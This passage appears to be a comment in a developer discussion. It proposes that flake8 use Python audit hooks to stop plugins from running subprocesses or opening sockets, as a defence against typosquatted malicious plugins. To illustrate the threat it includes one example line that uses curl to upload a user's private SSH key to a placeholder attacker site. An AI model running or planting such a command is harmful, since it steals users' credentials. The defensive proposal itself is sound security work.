I don't recall where I read that, sorry. But I've read it in several places :)\n\nAnyway, let me try and clarify.\n\nThe scenario I have in mind is this one:\n\n* Step 1, create a flake8 plugin, like flake8-bug-bear (note the additional dash)\n* Step 2, in the flake8 plugin do something evil like `subprocess.run(\"curl -F ‘data=@.ssh/id_rsa' https://my-evil-site.com\")`\n* Step 3, hope someone typos the name of the plugin\n* Step 4, enjoy collecting private ssh keys :)\n\n\nWhat I am proposing is using `sys.addaudithook` to prevent `subprocess.run` from being called by any flake8 plugin. I _think_ this cannot be done outside flake8 core, but I may be wrong of course.\n\nOther things we could block would be `socket.connect`. In a perfect world, we could have flake8 plugins not allowed accessing the filesystem _at all_ (after all source code and config files only have to be read once), but I'm not sure this is achievable using only hooks.\n\nI hope this is clearer, and thanks for the
